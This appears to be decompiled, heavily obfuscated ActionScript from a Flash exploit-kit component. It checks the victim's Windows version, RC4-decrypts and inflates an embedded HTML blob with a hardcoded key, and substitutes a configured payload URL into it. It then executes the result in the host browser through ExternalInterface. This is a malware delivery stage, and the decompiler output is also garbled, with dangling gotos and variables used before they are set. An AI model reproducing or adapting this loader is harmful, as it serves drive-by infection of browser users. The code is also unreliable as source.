package blobs
{
   import flash.system.Capabilities;
   import flash.utils.ByteArray;
   import Crypt.Crypt;
   import flash.external.ExternalInterface;
   
   public final class nw8
   {
       
      private var targets_info:Object;
      
      private var config_json:Object;
      
      private var m_myClass05:Class;
      
      private var m_myStr08:String;
      
      public function nw8(param1:Object, param2:Object)
      {
         if(!_loc7_)
         {
            m_myClass05 = §nw8_html_rc4$839751a392981f1ce098a727b1bcb875-2109608792§;
            if(!_loc6_)
            {
               if(!_loc6_)
               {
               }
               super();
               if(!_loc6_)
               {
                  if(_loc7_)
                  {
                     addr49:
                     while(true)
                     {
                        this.targets_info = param2;
                        if(!_loc7_)
                        {
                           if(!_loc6_)
                           {
                           }
                           addr83:
                           if(false === this.isSuitable())
                           {
                              if(!_loc6_)
                              {
                                 break;
                              }
                           }
                           else
                           {
                              this.m_myStr08 = "edfdamtlkfg511485";
                           }
                        }
                        break;
                     }
                  }
                  while(true)
                  {
                     this.config_json = param1;
                     if(_loc6_)
                     {
                     }
                  }
               }
               if(!_loc6_)
               {
               }
               return;
            }
            Crypt.rc4(_loc5_,this.m_myStr08).uncompress("deflate");
            var _loc3_:* = _loc5_.toString();
            if(!_loc6_)
            {
               §§push(_loc3_);
               if(!_loc6_)
               {
                  §§push("%payloadUrl%");
                  if(!_loc7_)
                  {
                     §§push(§§pop().replace(§§pop(),this.config_json.link.pnw8));
                     if(!_loc7_)
                     {
                        _loc3_ = §§pop();
                        if(!_loc6_)
                        {
                           if(_loc6_)
                           {
                              addr159:
                              loop2:
                              while(true)
                              {
                                 §§push(_loc4_);
                                 if(!_loc7_)
                                 {
                                    §§push("%embedHtml%");
                                    if(!_loc6_)
                                    {
                                       §§push(§§pop().replace(§§pop(),escape(_loc3_)));
                                    }
                                 }
                                 addr172:
                                 addr230:
                                 if(!_loc6_)
                                 {
                                    if(!_loc7_)
                                    {
                                       if(!_loc7_)
                                       {
                                          if(_loc6_)
                                          {
                                          }
                                       }
                                       addr201:
                                       while(true)
                                       {
                                          if(!_loc6_)
                                          {
                                          }
                                          break loop2;
                                       }
                                    }
                                 }
                                 while(true)
                                 {
                                    _loc3_ = §§pop();
                                    §§goto(addr172);
                                 }
                              }
                              return;
                           }
                           while(true)
                           {
                           }
                        }
                        while(true)
                        {
                           if(!_loc6_)
                           {
                              §§goto(addr159);
                           }
                           §§goto(addr242);
                        }
                     }
                  }
                  addr224:
                  while(true)
                  {
                     §§goto(addr230);
                  }
               }
               while(true)
               {
                  §§goto(addr224);
               }
            }
            while(true)
            {
               if(!_loc6_)
               {
               }
               ExternalInterface.call("function (){" + _loc4_ + "}");
               §§goto(addr201);
            }
         }
         while(true)
         {
            if(_loc6_)
            {
               break;
            }
            §§goto(addr49);
         }
         §§goto(addr83);
      }
      
      public final function isSuitable() : Boolean
      {
         if(!_loc2_)
         {
            §§push("Windows Vista");
            if(!_loc1_)
            {
               §§push(§§pop() === Capabilities.os);
               if(!_loc2_)
               {
                  §§push(!§§pop());
                  if(!_loc2_)
                  {
                     §§push(§§pop());
                     if(!_loc1_)
                     {
                        if(§§pop())
                        {
                           if(!_loc1_)
                           {
                              §§pop();
                              if(!_loc2_)
                              {
                                 §§push("Windows 7");
                                 if(!_loc1_)
                                 {
                                    §§push(§§pop() === Capabilities.os);
                                    if(!_loc2_)
                                    {
                                       §§push(!§§pop());
                                       if(_loc2_)
                                       {
                                       }
                                       addr56:
                                       §§pop();
                                       if(!_loc2_)
                                       {
                                          §§push("Windows 8");
                                          if(_loc2_)
                                          {
                                          }
                                       }
                                       addr134:
                                       §§push(false);
                                       if(!_loc2_)
                                       {
                                          addr138:
                                          return §§pop();
                                       }
                                       addr140:
                                       return §§pop();
                                    }
                                    addr89:
                                    §§pop();
                                    if(_loc1_)
                                    {
                                    }
                                    §§goto(addr134);
                                 }
                                 addr124:
                                 §§push(§§pop() === Capabilities.os);
                                 if(!_loc2_)
                                 {
                                    §§push(!§§pop());
                                    if(!_loc1_)
                                    {
                                       addr133:
                                       if(§§pop())
                                       {
                                          §§goto(addr134);
                                       }
                                       else
                                       {
                                          §§push(true);
                                       }
                                    }
                                    §§goto(addr138);
                                 }
                                 §§goto(addr140);
                              }
                              §§push("Windows 8.1");
                              if(!_loc1_)
                              {
                                 §§push(§§pop() === Capabilities.os);
                                 if(!_loc2_)
                                 {
                                    §§push(!§§pop());
                                    if(!_loc1_)
                                    {
                                       addr115:
                                       §§push(§§pop());
                                    }
                                 }
                                 §§goto(addr133);
                              }
                              §§goto(addr124);
                           }
                           addr119:
                           §§pop();
                           if(_loc2_)
                           {
                           }
                           §§goto(addr134);
                        }
                        §§push(§§pop());
                        if(!_loc1_)
                        {
                           if(§§pop())
                           {
                              if(!_loc2_)
                              {
                                 §§goto(addr56);
                              }
                              §§goto(addr140);
                           }
                        }
                     }
                     addr116:
                     if(§§pop())
                     {
                        if(!_loc1_)
                        {
                           §§goto(addr119);
                        }
                        §§goto(addr138);
                     }
                     §§goto(addr133);
                  }
                  addr78:
                  §§push(!§§pop());
                  if(_loc1_)
                  {
                  }
                  §§goto(addr115);
               }
               §§push(§§pop());
               if(!_loc2_)
               {
                  if(§§pop())
                  {
                     if(!_loc2_)
                     {
                        §§goto(addr89);
                     }
                     §§goto(addr119);
                  }
                  §§goto(addr115);
               }
               §§goto(addr116);
            }
            §§push(§§pop() === Capabilities.os);
            if(!_loc1_)
            {
               §§goto(addr78);
            }
            §§goto(addr89);
         }
         §§goto(addr124);
      }
   }
}
